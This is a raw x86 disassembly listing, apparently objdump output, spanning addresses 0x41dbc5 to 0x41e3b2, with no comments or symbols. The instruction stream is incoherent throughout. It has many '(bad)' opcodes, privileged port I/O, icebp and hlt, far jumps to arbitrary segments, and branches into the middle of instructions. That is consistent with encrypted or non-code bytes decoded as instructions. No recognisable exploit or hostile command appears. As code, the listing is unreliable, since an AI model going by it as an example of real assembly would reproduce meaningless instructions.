  41dbc5:	cmc    
  41dbc6:	xor    al,0xda
  41dbc8:	xor    BYTE PTR [edi-0x4429f62c],bh
  41dbce:	mov    ds:0x1f5d6589,al
  41dbd3:	mov    BYTE PTR [ebp+edx*8-0x2e545098],cl
  41dbda:	aad    0x6
  41dbdc:	mov    esi,0x6a14609c
  41dbe1:	xor    eax,0xd643f185
  41dbe6:	pop    edi
  41dbe7:	mov    edi,0x970b6914
  41dbec:	dec    ebx
  41dbed:	cwde   
  41dbee:	add    DWORD PTR [ebx],edx
  41dbf0:	in     al,dx
  41dbf1:	mov    edx,0xc9d359b
  41dbf6:	stc    
  41dbf7:	push   0xfffffffb
  41dbf9:	mov    esi,eax
  41dbfb:	out    0xcf,eax
  41dbfd:	sub    al,0xd9
  41dbff:	gs icebp 
  41dc01:	adc    eax,0xd81ce51e
  41dc06:	mov    al,0x39
  41dc08:	mov    DWORD PTR ds:0xfa2443da,esi
  41dc0e:	inc    ebp
  41dc0f:	inc    esi
  41dc10:	out    dx,eax
  41dc11:	mov    cs,WORD PTR [eax]
  41dc13:	jecxz  0x41dc5c
  41dc15:	cmp    eax,0x1897f588
  41dc1a:	add    edx,ebx
  41dc1c:	cs rcr dl,1
  41dc1f:	jb     0x41dc42
  41dc21:	jns    0x41dc97
  41dc23:	out    0x9c,eax
  41dc25:	jb     0x41dbdb
  41dc27:	pop    esp
  41dc28:	inc    edi
  41dc29:	out    0xbd,eax
  41dc2b:	shr    al,cl
  41dc2d:	xchg   esp,eax
  41dc2e:	pop    edx
  41dc2f:	lahf   
  41dc30:	mov    ds:0xcef540a8,eax
  41dc35:	inc    edx
  41dc36:	inc    eax
  41dc37:	sbb    dh,BYTE PTR [edx+0x7509018]
  41dc3d:	(bad)  
  41dc3e:	ins    BYTE PTR es:[edi],dx
  41dc3f:	add    ecx,DWORD PTR [ebp+0x5952fd1]
  41dc45:	push   cs
  41dc46:	sbb    DWORD PTR [eax-0x7050f8cb],0xffffffc5
  41dc4d:	(bad)  
  41dc4e:	outs   dx,DWORD PTR ds:[esi]
  41dc4f:	retf   
  41dc50:	sub    esi,edx
  41dc52:	loope  0x41dc73
  41dc54:	push   ebp
  41dc55:	lods   eax,DWORD PTR ds:[esi]
  41dc56:	xor    eax,0x9a567ad2
  41dc5b:	cdq    
  41dc5c:	xor    eax,0x9325ab90
  41dc61:	cmp    eax,0xce6f8d3e
  41dc66:	ins    DWORD PTR es:[edi],dx
  41dc67:	xor    BYTE PTR [ebx],ah
  41dc69:	sub    ecx,DWORD PTR [ebx+0x16ec08df]
  41dc6f:	(bad)  
  41dc70:	(bad)  
  41dc72:	dec    edx
  41dc73:	test   eax,0x87317974
  41dc78:	dec    ebp
  41dc79:	pop    ebp
  41dc7a:	mov    cl,0xc0
  41dc7c:	pop    ds
  41dc7d:	cld    
  41dc7e:	add    dl,BYTE PTR [eax-0x4f]
  41dc81:	jo     0x41dc52
  41dc83:	imul   esp,DWORD PTR [ecx],0xc4bde8f1
  41dc89:	(bad)  
  41dc8b:	push   ss
  41dc8c:	sbb    dh,bl
  41dc8e:	mov    esi,0x287ce9c3
  41dc93:	push   es
  41dc94:	jle    0x41dcd8
  41dc96:	adc    BYTE PTR [eax],al
	...
  41dd14:	popa   
  41dd15:	push   0xffffffe9
  41dd17:	pop    ss
  41dd18:	jmp    0x41dcb1
  41dd1a:	(bad)  
  41dd1b:	jle    0x41dd23
  41dd1d:	js     0x41dccc
  41dd1f:	aam    0x67
  41dd21:	lods   al,BYTE PTR ds:[esi]
  41dd22:	sbb    eax,0x178a0f2
  41dd27:	add    BYTE PTR [ebx+0x7],ch
  41dd2a:	add    BYTE PTR [eax],al
  41dd2c:	shl    DWORD PTR [edi+esi*8-0x78],0xad
  41dd31:	jg     0x41dd5b
  41dd33:	dec    edx
  41dd34:	inc    ecx
  41dd35:	fadd   DWORD PTR [edx-0x43af99b]
  41dd3b:	jnp    0x41dda6
  41dd3d:	push   DWORD PTR ss:[edi+ebx*1]
  41dd41:	push   ecx
  41dd42:	loope  0x41dcc5
  41dd44:	add    ecx,ebx
  41dd46:	test   DWORD PTR [ebx-0x1f619385],ecx
  41dd4c:	mov    eax,0x23647cda
  41dd51:	mov    ebx,0xfc950c79
  41dd56:	xor    eax,0x51fb8180
  41dd5b:	lods   al,BYTE PTR ds:[esi]
  41dd5c:	mov    bh,0x81
  41dd5e:	stos   BYTE PTR es:[edi],al
  41dd5f:	enter  0x414d,0x39
  41dd63:	add    eax,0xddf24a6c
  41dd68:	out    0x5b,eax
  41dd6a:	cmp    ecx,esp
  41dd6c:	pop    esi
  41dd6d:	nop    DWORD PTR ss:[esp+ecx*2]
  41dd72:	cmp    ebx,DWORD PTR [ebp+0xe]
  41dd75:	sub    eax,0x90452670
  41dd7a:	and    bl,BYTE PTR [esi]
  41dd7c:	cwde   
  41dd7d:	mov    ebp,0xf688ec5
  41dd82:	adc    edi,DWORD PTR [ecx]
  41dd84:	sbb    bl,cl
  41dd86:	lods   eax,DWORD PTR ds:[esi]
  41dd87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd88:	sub    ah,bl
  41dd8a:	jmp    0x5a64:0x7585f5c2
  41dd91:	rol    BYTE PTR [esi],0x4a
  41dd94:	jb     0x41ddbb
  41dd96:	test   BYTE PTR [ebp-0x5d],0xcc
  41dd9a:	(bad)
  41dd9e:	pop    ds
  41dd9f:	sub    BYTE PTR [esi],0xbb
  41dda2:	ja     0x41de05
  41dda4:	sub    al,0x61
  41dda6:	add    eax,DWORD PTR [esp+edx*8+0x5c]
  41ddaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddab:	inc    eax
  41ddac:	xlat   BYTE PTR ds:[ebx]
  41ddad:	fnstcw WORD PTR ds:0x8425c852
  41ddb3:	repnz fwait
  41ddb5:	retf   0x9dd9
  41ddb8:	push   ecx
  41ddb9:	adc    DWORD PTR [ecx-0x554ebd8d],ebp
  41ddbf:	ror    ecx,cl
  41ddc1:	das    
  41ddc2:	dec    esp
  41ddc3:	lods   eax,DWORD PTR ds:[esi]
  41ddc4:	test   al,0x55
  41ddc6:	inc    esi
  41ddc7:	pop    ecx
  41ddc8:	mov    dl,0xe8
  41ddca:	jecxz  0x41ddcf
  41ddcc:	sbb    al,0xef
  41ddce:	push   es
  41ddcf:	repnz fimul WORD PTR [edx+0x1f]
  41ddd3:	outs   dx,DWORD PTR ds:[esi]
  41ddd4:	lods   al,BYTE PTR ds:[esi]
  41ddd5:	mov    ch,0x7e
  41ddd7:	in     al,0x65
  41ddd9:	lock ret 0x697c
  41dddd:	hlt    
  41ddde:	mov    bh,0xbf
  41dde1:	icebp  
  41dde2:	ins    BYTE PTR es:[edi],dx
  41dde3:	xor    eax,0x15342cf5
  41dde8:	or     BYTE PTR ds:0x7c8928bf,bl
  41ddee:	pop    esp
  41ddef:	ret    0x86ed
  41ddf2:	jo     0x41de0a
  41ddf4:	bound  edi,QWORD PTR [ebx+0x2d9e13c0]
  41ddfa:	cdq    
  41ddfb:	rol    DWORD PTR [eax-0x1c],0x69
  41ddff:	(bad)  
  41de00:	dec    esp
  41de01:	mov    eax,ds:0xd3311307
  41de06:	jmp    0x41de6d
  41de08:	loopne 0x41de52
  41de0a:	sub    esp,esp
  41de0c:	push   ss
  41de0d:	out    0x25,eax
  41de0f:	in     al,dx
  41de10:	push   edx
  41de11:	(bad)  [ecx-0x59]
  41de14:	mov    ds:0xf70f126c,eax
  41de19:	push   esp
  41de1a:	test   eax,0xdd2086a7
  41de1f:	xor    eax,0xbe3dd08c
  41de24:	ja     0x41de45
  41de26:	push   edi
  41de27:	fimul  WORD PTR [ecx+esi*4]
  41de2a:	and    DWORD PTR [eax+0x53ca3b36],ebx
  41de30:	add    BYTE PTR [eax],dl
  41de32:	jle    0x41dde3
  41de34:	push   ds
  41de35:	inc    esi
  41de36:	sti    
  41de37:	cmp    esp,esp
  41de39:	push   esp
  41de3a:	imul   ebp,DWORD PTR [ebx+ebp*2],0x3957f7de
  41de41:	xor    BYTE PTR ds:0xd96b9bd,dl
  41de47:	or     eax,0xa52bb08b
  41de4c:	jae    0x41de42
  41de4e:	sub    BYTE PTR [ebx-0x27b8af4],bh
  41de54:	push   es
  41de55:	nop
  41de56:	inc    dx
  41de58:	outs   dx,BYTE PTR ds:[esi]
  41de59:	lods   eax,DWORD PTR ds:[esi]
  41de5a:	cmc    
  41de5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de5c:	out    dx,eax
  41de5d:	push   ecx
  41de5e:	arpl   WORD PTR [ecx+0x2783cd44],ax
  41de64:	stos   DWORD PTR es:[edi],eax
  41de65:	ror    eax,1
  41de67:	adc    eax,0x5770ae0d
  41de6c:	jle    0x41de31
  41de6e:	mov    ds:0x43263273,eax
  41de73:	or     BYTE PTR [ecx],ch
  41de75:	sar    DWORD PTR [esp+esi*8-0x7f3b7c87],1
  41de7c:	xchg   DWORD PTR ds:0xf45a7b86,eax
  41de82:	adc    dh,BYTE PTR ds:0x74ce25d5
  41de88:	inc    ebx
  41de89:	icebp  
  41de8a:	js     0x41dee6
  41de8c:	jbe    0x41de26
  41de8e:	jbe    0x41dea9
  41de90:	inc    ecx
  41de91:	or     bh,0xa
  41de94:	adc    dl,BYTE PTR [ecx-0x3fb90a1f]
  41de9a:	mov    ah,0xd1
  41de9c:	lahf   
  41de9d:	mov    BYTE PTR [eax+0x51],dl
  41dea0:	ds ja  0x41df14
  41dea3:	imul   esi
  41dea5:	leave  
  41dea6:	test   al,0x30
  41dea8:	lahf   
  41dea9:	xor    DWORD PTR [ebx+0x4f9f979],ecx
  41deaf:	sbb    al,0xee
  41deb1:	xlat   BYTE PTR ds:[ebx]
  41deb2:	cs ret 0x659f
  41deb6:	xchg   BYTE PTR [ecx+esi*8-0x63a3131f],ah
  41debd:	push   eax
  41debe:	jne    0x41de40
  41dec0:	fcmovb st,st(5)
  41dec2:	dec    ebp
  41dec3:	arpl   bx,si
  41dec5:	imul   ebx,DWORD PTR [ebx+0x72ef83d3],0xc34c0ca4
  41decf:	jno    0x41de6a
  41ded1:	push   ds
  41ded2:	loope  0x41de55
  41ded4:	and    eax,0x6496ae3b
  41ded9:	and    al,BYTE PTR [esi-0x355e927b]
  41dedf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee0:	in     eax,0xdb
  41dee2:	daa    
  41dee3:	(bad)  
  41dee4:	int3   
  41dee5:	jecxz  0x41df2b
  41dee7:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41dee9:	pop    ds
  41deea:	outs   dx,BYTE PTR ds:[esi]
  41deeb:	mov    ds:0x1b40b98f,eax
  41def0:	and    eax,0x52c691ea
  41def5:	inc    ecx
  41def6:	inc    ebp
  41def7:	jecxz  0x41df66
  41def9:	cli    
  41defa:	aam    0xe0
  41defc:	rcl    DWORD PTR [esi+0x1e],cl
  41deff:	jge    0x41df33
  41df01:	pop    ss
  41df02:	mov    esp,0xf1b16815
  41df07:	jle    0x41df81
  41df09:	mov    ds:0xb5cb247e,eax
  41df0e:	pop    esi
  41df0f:	jne    0x41df34
  41df11:	aam    0x7a
  41df13:	push   edi
  41df14:	xchg   ecx,eax
  41df15:	in     eax,0x93
  41df17:	pusha  
  41df18:	jo     0x41df38
  41df1a:	in     al,0xfc
  41df1c:	or     esi,0x14
  41df1f:	pop    es
  41df20:	lods   al,BYTE PTR ds:[esi]
  41df21:	ds iret 
  41df23:	jmp    0x41df51
  41df25:	xor    ecx,eax
  41df27:	sub    al,0xd4
  41df29:	bound  esi,QWORD PTR [ecx+0x5f01d62]
  41df2f:	mov    dl,0x26
  41df31:	pop    edi
  41df32:	cdq    
  41df33:	repz sar BYTE PTR [ecx+0x6c],1
  41df37:	stos   BYTE PTR es:[edi],al
  41df38:	add    edi,DWORD PTR [edx+0x6f84fc96]
  41df3e:	out    dx,eax
  41df3f:	fcomp  DWORD PTR [esi]
  41df41:	shr    DWORD PTR [eax+0x3f],0x3e
  41df45:	xor    BYTE PTR [ebx-0x299bf329],ch
  41df4b:	mov    ebx,0x777a4538
  41df50:	sub    ah,bl
  41df52:	and    eax,0x8c7700c6
  41df57:	xchg   esi,eax
  41df58:	fisttp DWORD PTR [edx+ecx*2-0x3e]
  41df5c:	push   edx
  41df5d:	sbb    al,0xb5
  41df5f:	mov    eax,ds:0x90ce2557
  41df64:	push   esi
  41df65:	xchg   edi,eax
  41df66:	inc    ecx
  41df67:	test   BYTE PTR [eax+0x25],al
  41df6a:	icebp  
  41df6b:	inc    ebx
  41df6c:	and    DWORD PTR [esi],ebx
  41df6e:	and    BYTE PTR [ecx+eax*1+0x51e5544b],dl
  41df75:	and    al,0xe1
  41df77:	arpl   WORD PTR [ebx+0x63],cx
  41df7a:	xchg   ebp,eax
  41df7b:	aam    0xdf
  41df7d:	loope  0x41dfc4
  41df7f:	and    al,0x78
  41df81:	sbb    BYTE PTR [ecx-0x12],ch
  41df84:	in     al,dx
  41df85:	das    
  41df86:	sub    cl,BYTE PTR [ebx-0x58]
  41df89:	push   es
  41df8a:	push   ss
  41df8b:	in     eax,dx
  41df8c:	adc    eax,0x3b0fe2b5
  41df91:	inc    ecx
  41df92:	fild   DWORD PTR [edx]
  41df94:	mov    bh,0xc2
  41df96:	mov    ?,WORD PTR [ecx]
  41df98:	pop    es
  41df99:	test   al,0xdb
  41df9b:	mov    dl,0x99
  41df9d:	fsubr  DWORD PTR [esi-0x5]
  41dfa0:	inc    edi
  41dfa1:	mov    bl,0xe7
  41dfa3:	sub    eax,0x2933d96e
  41dfa8:	loop   0x41dff8
  41dfaa:	sbb    bl,BYTE PTR [edi]
  41dfac:	jp     0x41df51
  41dfae:	xchg   edx,eax
  41dfaf:	jecxz  0x41df91
  41dfb1:	jae    0x41dfd2
  41dfb3:	add    al,0xb2
  41dfb5:	in     eax,dx
  41dfb6:	ss imul esi,eax,0xfd097cf3
  41dfbd:	jecxz  0x41df45
  41dfbf:	leave  
  41dfc0:	mov    al,ds:0x7c227ce8
  41dfc5:	lock inc eax
  41dfc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfc8:	lock dec ebx
  41dfca:	test   ecx,0x53bcee4e
  41dfd0:	sub    eax,0x39d36faf
  41dfd5:	xlat   BYTE PTR ds:[ebx]
  41dfd6:	rcl    DWORD PTR [ebp+0x50],cl
  41dfd9:	lods   eax,DWORD PTR ds:[esi]
  41dfda:	ja     0x41df78
  41dfdc:	pop    es
  41dfdd:	lock sbb al,0x1a
  41dfe0:	and    al,al
  41dfe2:	stos   DWORD PTR es:[edi],eax
  41dfe3:	div    edi
  41dfe5:	out    0x4b,al
  41dfe7:	jl     0x41e01f
  41dfe9:	or     eax,0x4f6c6444
  41dfee:	lea    esi,[ebx+0x39]
  41dff1:	ins    DWORD PTR es:[edi],dx
  41dff2:	cmp    al,0x67
  41dff4:	call   0xa80b:0x698f145f
  41dffb:	xor    al,0x41
  41dffd:	iret   
  41dffe:	jg     0x41e033
  41e000:	enter  0x114,0x18
  41e004:	cld    
  41e005:	data16 hlt 
  41e007:	mov    al,0xcb
  41e009:	test   eax,0x4f5b8af0
  41e00e:	mov    esi,0x3c7835e5
  41e013:	stos   BYTE PTR es:[edi],al
  41e014:	das    
  41e015:	fdiv   QWORD PTR [ebp+0x2753971c]
  41e01b:	imul   esp,DWORD PTR [ecx+ebp*4-0xc],0x66
  41e020:	pop    eax
  41e021:	jnp    0x41dfd9
  41e023:	out    0xa0,al
  41e025:	xchg   edi,eax
  41e026:	repz repnz test eax,0xf8fd8753
  41e02d:	pop    esp
  41e02e:	es inc esp
  41e030:	pop    DWORD PTR [ebp+0x3]
  41e033:	pop    esi
  41e034:	pushf  
  41e035:	lea    edi,[ebp+0x74]
  41e038:	lahf   
  41e039:	js     0x41e00f
  41e03b:	scas   al,BYTE PTR es:[edi]
  41e03c:	test   eax,0xdf726946
  41e041:	mov    al,ds:0xcdbda80
  41e046:	scas   eax,DWORD PTR es:[edi]
  41e047:	xchg   esp,eax
  41e048:	pop    ecx
  41e049:	pop    es
  41e04a:	loopne 0x41e073
  41e04c:	dec    ecx
  41e04d:	addr16 mov esi,0x924b892b
  41e053:	loop   0x41e06e
  41e055:	inc    esi
  41e056:	(bad)  
  41e057:	fidivr DWORD PTR [ecx]
  41e059:	sbb    eax,0xc7412834
  41e05e:	dec    ebp
  41e05f:	xchg   DWORD PTR [ebp-0x46],ecx
  41e062:	xchg   edx,eax
  41e063:	sbb    BYTE PTR [esi],bh
  41e065:	pop    eax
  41e066:	sar    BYTE PTR [ebx+ebx*8],1
  41e069:	(bad)
  41e06d:	test   ch,bl
  41e06f:	daa    
  41e070:	jg     0x41dff6
  41e072:	fnstsw WORD PTR [edi]
  41e074:	jb     0x41e006
  41e076:	sahf   
  41e077:	mov    ds:0xa4222015,eax
  41e07c:	scas   al,BYTE PTR es:[edi]
  41e07d:	push   cs
  41e07e:	push   edx
  41e07f:	mov    bh,0x1c
  41e081:	or     ch,BYTE PTR [esi-0x357408e6]
  41e087:	inc    edx
  41e088:	les    edx,FWORD PTR [edi-0x5930fac8]
  41e08e:	ror    BYTE PTR [ebx+0x344712f5],1
  41e094:	fucomp st(5)
  41e096:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e097:	mov    bh,0xd3
  41e099:	mov    al,ds:0xaf632bcf
  41e09e:	fsub   DWORD PTR [ebp-0x67]
  41e0a1:	jbe    0x41e0c0
  41e0a3:	jb     0x41e0c0
  41e0a5:	jge    0x41e0b0
  41e0a7:	adc    eax,0xe2e26bfe
  41e0ac:	out    0x7,eax
  41e0ae:	and    DWORD PTR [ebp-0x6a],ebp
  41e0b1:	push   0xb6d70344
  41e0b6:	pop    edi
  41e0b7:	mov    bl,0x38
  41e0b9:	or     esp,0xffffffee
  41e0bc:	pop    eax
  41e0bd:	push   ss
  41e0be:	pop    edi
  41e0bf:	and    al,0x58
  41e0c1:	dec    esi
  41e0c2:	push   0xaeda24f1
  41e0c7:	cmp    al,0xd8
  41e0c9:	fst    QWORD PTR [edx+0x75]
  41e0cc:	or     eax,0x77092cbf
  41e0d1:	adc    BYTE PTR [edx-0x67],ch
  41e0d4:	dec    ebx
  41e0d5:	jno    0x41e05a
  41e0d7:	pop    ss
  41e0d8:	retf   0x25b6
  41e0db:	cli    
  41e0dc:	stos   BYTE PTR es:[edi],al
  41e0dd:	xchg   edx,eax
  41e0de:	pop    ebp
  41e0df:	xchg   ecx,eax
  41e0e0:	dec    ebp
  41e0e1:	jmp    0x41e0a8
  41e0e3:	mov    ebp,0x6a158ef3
  41e0e8:	cdq    
  41e0e9:	ja     0x41e0e9
  41e0eb:	and    dl,bh
  41e0ed:	inc    edi
  41e0ee:	fiadd  WORD PTR [ebp-0x2a]
  41e0f1:	push   ebx
  41e0f2:	das    
  41e0f3:	pop    ebx
  41e0f4:	push   ds
  41e0f5:	adc    al,0x42
  41e0f7:	xor    DWORD PTR [ebx],ebp
  41e0f9:	inc    ebx
  41e0fa:	rol    ebp,cl
  41e0fc:	sbb    al,0x71
  41e0fe:	fidiv  WORD PTR [ecx+0xdc0e66a]
  41e104:	or     ebx,DWORD PTR [edi+0x50]
  41e107:	fwait
  41e108:	lock test al,0xfa
  41e10b:	loope  0x41e10b
  41e10d:	test   DWORD PTR [ebx],ecx
  41e10f:	push   0xfffffff3
  41e111:	and    esi,DWORD PTR [ebx+eax*4-0x64]
  41e115:	cmp    ebp,ebp
  41e117:	xchg   cl,cl
  41e119:	push   esi
  41e11a:	push   0xc47f85b
  41e11f:	movups xmm5,xmm1
  41e122:	aad    0x1b
  41e124:	into   
  41e125:	lds    eax,FWORD PTR [edi+0x68]
  41e128:	add    cl,cl
  41e12a:	arpl   WORD PTR [esi-0x54ac6240],bp
  41e130:	mov    bl,0x4f
  41e132:	das    
  41e133:	and    DWORD PTR [ebx+edi*1+0x16226062],ebp
  41e13a:	rol    BYTE PTR ds:0x589747d9,cl
  41e140:	mov    ss,WORD PTR [edx]
  41e142:	dec    ebp
  41e143:	mov    ah,0x26
  41e145:	dec    edi
  41e146:	xor    ebx,DWORD PTR [eax-0x3b9c4f17]
  41e14c:	mov    eax,ss:0xbe3317ba
  41e152:	stos   BYTE PTR es:[edi],al
  41e153:	xlat   BYTE PTR ds:[ebx]
  41e154:	in     ax,0x5e
  41e157:	or     al,BYTE PTR [edx]
  41e159:	inc    edx
  41e15a:	int3   
  41e15b:	lods   eax,DWORD PTR ds:[esi]
  41e15c:	sbb    dl,cl
  41e15e:	mov    esp,0x66c5d43e
  41e163:	iret   
  41e164:	pop    es
  41e165:	pop    ecx
  41e166:	(bad)  
  41e167:	shl    BYTE PTR [eax+0x6ef9ee74],cl
  41e16d:	gs pop ebp
  41e16f:	das    
  41e170:	lock xor DWORD PTR [ebx],edx
  41e173:	ror    DWORD PTR [ebx],1
  41e175:	and    eax,0xe9e6f646
  41e17a:	jp     0x41e113
  41e17c:	xchg   edi,eax
  41e17d:	in     eax,dx
  41e17e:	(bad)  
  41e17f:	scas   eax,DWORD PTR es:[edi]
  41e180:	ret    0xdedf
  41e183:	cli    
  41e184:	mov    eax,0x6f9476d2
  41e189:	(bad)  
  41e18a:	loope  0x41e1a5
  41e18c:	jbe    0x41e186
  41e18e:	call   0x2435:0xf9ece54a
  41e195:	mov    edi,0xd49a40f4
  41e19a:	mov    eax,ds:0x8e365148
  41e19f:	cmp    eax,0xc021e163
  41e1a4:	or     al,0x27
  41e1a6:	(bad)  
  41e1a7:	leave  
  41e1a8:	mov    WORD PTR [esi-0x4a],es
  41e1ab:	sub    BYTE PTR [edi],ah
  41e1ad:	sub    bl,BYTE PTR [edi]
  41e1af:	or     dl,al
  41e1b1:	jmp    0x22855e36
  41e1b6:	repz jo 0x41e1ef
  41e1b9:	dec    esi
  41e1ba:	mov    BYTE PTR [eax+edx*2-0x3],dh
  41e1be:	sub    dl,BYTE PTR [ebp+0x6d1300b8]
  41e1c4:	fwait
  41e1c5:	add    BYTE PTR [edi],bh
  41e1c7:	nop
  41e1c8:	test   DWORD PTR [edx],0x124a2a8d
  41e1ce:	mov    cl,bh
  41e1d0:	inc    BYTE PTR [ebx+edi*8-0x502e6fe5]
  41e1d7:	stos   DWORD PTR es:[edi],eax
  41e1d8:	jne    0x41e1a9
  41e1da:	je     0x41e183
  41e1dc:	fsub   st,st(1)
  41e1de:	jbe    0x41e1b6
  41e1e0:	xor    ch,dh
  41e1e2:	mov    cl,0x43
  41e1e4:	into   
  41e1e5:	pop    edx
  41e1e6:	adc    esp,DWORD PTR [eax+0x1]
  41e1e9:	test   DWORD PTR [edi+0x5afb835],esi
  41e1ef:	iret   
  41e1f0:	sub    DWORD PTR [edi+eiz*4-0x37],ebp
  41e1f4:	jmp    0xc2151d98
  41e1f9:	and    BYTE PTR [eax+0x7d],dh
  41e1fc:	ret    0x7d5c
  41e1ff:	out    dx,al
  41e200:	outs   dx,BYTE PTR ds:[esi]
  41e201:	rcr    DWORD PTR [ecx-0x28],0x27
  41e205:	daa    
  41e206:	jp     0x41e279
  41e208:	add    eax,0xc9a96acf
  41e20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e20e:	out    0xe2,al
  41e210:	cmp    DWORD PTR [ebx],ecx
  41e212:	adc    BYTE PTR [eax],al
  41e214:	lahf   
  41e215:	or     esp,DWORD PTR [edi+0x2e]
  41e218:	mov    DWORD PTR [edi+0x37],esp
  41e21b:	jbe    0x41e1a8
  41e21d:	jg     0x41e28c
  41e21f:	std    
  41e220:	outs   dx,DWORD PTR ds:[esi]
  41e221:	(bad)  
  41e222:	push   edi
  41e223:	es jne 0x41e234
  41e226:	fldcw  WORD PTR [edi+0x868e6e6]
  41e22c:	sar    BYTE PTR [ebx+edi*4+0x2a85312c],0xcb
  41e234:	jmp    0x8a34:0x4ba1951a
  41e23b:	(bad)  
  41e23c:	cdq    
  41e23d:	js     0x41e1c6
  41e23f:	push   ebp
  41e240:	xchg   edx,eax
  41e241:	fisubr DWORD PTR ds:0x68e54867
  41e247:	jnp    0x41e201
  41e249:	dec    edi
  41e24a:	jp     0x41e1cc
  41e24c:	or     al,0x25
  41e24e:	or     eax,0xb7ac6119
  41e253:	dec    esp
  41e254:	retf   0x6ee1
  41e257:	fidivr DWORD PTR [eax+0x5d196e7]
  41e25d:	pop    ds
  41e25e:	cs dec ebp
  41e260:	jp     0x41e239
  41e262:	jb     0x41e204
  41e264:	xchg   ebp,eax
  41e265:	aam    0xa7
  41e267:	sub    eax,0xe6bf3bbb
  41e26c:	inc    edx
  41e26d:	push   ss
  41e26e:	mov    ebp,0x6734f65e
  41e273:	add    al,0xfe
  41e275:	mov    ebx,edi
  41e277:	sub    BYTE PTR [edi-0x4a832621],dh
  41e27d:	loope  0x41e28e
  41e27f:	jbe    0x41e29f
  41e281:	xchg   esp,eax
  41e282:	mov    ecx,0x5134cac5
  41e287:	popf   
  41e288:	aas    
  41e289:	mov    ecx,0x9ccf14a4
  41e28e:	push   eax
  41e28f:	inc    eax
  41e290:	ret    
  41e291:	fs or  eax,0x2e8b2d20
  41e297:	pop    edi
  41e298:	int3   
  41e299:	je     0x41e27f
  41e29b:	cmc    
  41e29c:	mov    esp,0xb7550e2a
  41e2a1:	(bad)  
  41e2a2:	aas    
  41e2a3:	sub    ebx,edx
  41e2a5:	sbb    edx,DWORD PTR [edx+ebp*8]
  41e2a8:	lds    esi,FWORD PTR [edi]
  41e2aa:	sbb    ebx,DWORD PTR [ebp+0x70]
  41e2ad:	es jle 0x41e2c8
  41e2b0:	out    dx,al
  41e2b1:	les    esp,FWORD PTR [esi]
  41e2b3:	outs   dx,BYTE PTR ds:[esi]
  41e2b4:	lock add eax,0xe9b5bb0b
  41e2ba:	add    eax,0xa553af33
  41e2bf:	in     al,dx
  41e2c0:	loope  0x41e2fd
  41e2c2:	fsub   QWORD PTR [ebp+ecx*2-0x6ee773ba]
  41e2c9:	test   DWORD PTR [ebx+0x1b7f2b8e],0x585513bd
  41e2d3:	pop    ss
  41e2d4:	fmul   QWORD PTR [eax]
  41e2d6:	fdiv   st,st(1)
  41e2d8:	fidiv  DWORD PTR [ecx-0x2c25785f]
  41e2de:	(bad)  
  41e2e0:	test   DWORD PTR [ebx],0x9962728c
  41e2e6:	jge    0x41e27e
  41e2e8:	mov    eax,0x2782fd60
  41e2ed:	seto   BYTE PTR [edx-0x77]
  41e2f1:	pop    es
  41e2f2:	ret    0x8b7a
  41e2f5:	sub    eax,0xc059af73
  41e2fa:	(bad)  
  41e2fc:	nop
  41e2fd:	fdivr  DWORD PTR [ebx-0x3]
  41e300:	pop    ebx
  41e301:	out    0x16,al
  41e303:	repz fsub DWORD PTR [eax]
  41e306:	inc    esi
  41e307:	repz jl 0x41e34c
  41e30a:	sbb    cl,BYTE PTR [esi]
  41e30c:	inc    ecx
  41e30d:	push   cs
  41e30e:	lods   eax,DWORD PTR ds:[esi]
  41e30f:	scas   eax,DWORD PTR es:[edi]
  41e310:	cmp    eax,0x9991d83d
  41e315:	(bad)  
  41e316:	and    BYTE PTR [ecx+edi*1+0x67f0eaec],dl
  41e31d:	jae    0x41e328
  41e31f:	aam    0xa0
  41e321:	dec    esi
  41e322:	xchg   ebp,eax
  41e323:	cmp    esp,ecx
  41e325:	retf   
  41e326:	test   al,0xe8
  41e328:	add    DWORD PTR [edi+0x7b],edi
  41e32b:	cmp    BYTE PTR [eax],al
  41e32d:	cmp    BYTE PTR [edi],ah
  41e32f:	xor    BYTE PTR [esi+0x3cefe3fd],dh
  41e335:	scas   eax,DWORD PTR es:[edi]
  41e336:	jg     0x41e2b8
  41e338:	(bad)  
  41e339:	fs stos DWORD PTR es:[edi],eax
  41e33b:	iret   
  41e33c:	pop    eax
  41e33d:	and    edx,DWORD PTR [eax-0x24]
  41e340:	adc    DWORD PTR [ebp+0x24],edx
  41e343:	ss repz pop ebx
  41e346:	xchg   esp,eax
  41e347:	std    
  41e348:	retf   0x5745
  41e34b:	push   0x2134e1f9
  41e350:	add    al,0x7e
  41e352:	and    esi,ebx
  41e354:	mov    al,ds:0x1b46cbdf
  41e359:	inc    ecx
  41e35a:	ss xchg esp,eax
  41e35c:	adc    eax,edx
  41e35e:	das    
  41e35f:	sahf   
  41e360:	shr    bh,0xac
  41e363:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41e365:	pop    edi
  41e366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e367:	rcl    BYTE PTR [ecx-0x28],1
  41e36a:	lahf   
  41e36b:	jae    0x41e387
  41e36d:	leave  
  41e36e:	test   eax,0x45d6aa13
  41e373:	sbb    eax,ebx
  41e375:	push   ss
  41e376:	pop    eax
  41e377:	sahf   
  41e378:	adc    BYTE PTR [edi+0x26],0x7e
  41e37c:	loope  0x41e31b
  41e37e:	push   0xcaf0609b
  41e383:	xor    bh,BYTE PTR [edx+edi*4-0x523e7bbc]
  41e38a:	outs   dx,BYTE PTR ds:[esi]
  41e38b:	in     eax,dx
  41e38c:	push   edx
  41e38d:	mov    dh,0x12
  41e38f:	push   ds
  41e390:	jmp    0x4b68:0xf2ae5339
  41e397:	lods   eax,DWORD PTR ds:[esi]
  41e398:	mov    esp,0x6bbeacae
  41e39d:	mov    DWORD PTR [ecx-0x6d6fa0e9],edx
  41e3a3:	adc    BYTE PTR [esi],dh
  41e3a5:	js     0x41e39f
  41e3a7:	popf   
  41e3a8:	cmp    eax,DWORD PTR [ebx]
  41e3aa:	push   ds
  41e3ab:	pop    edi
  41e3ac:	adc    si,WORD PTR [ebx+0x58]
  41e3b0:	sbb    al,0xf8
  41e3b2:	xchg   DWORD PTR [eax],ecx
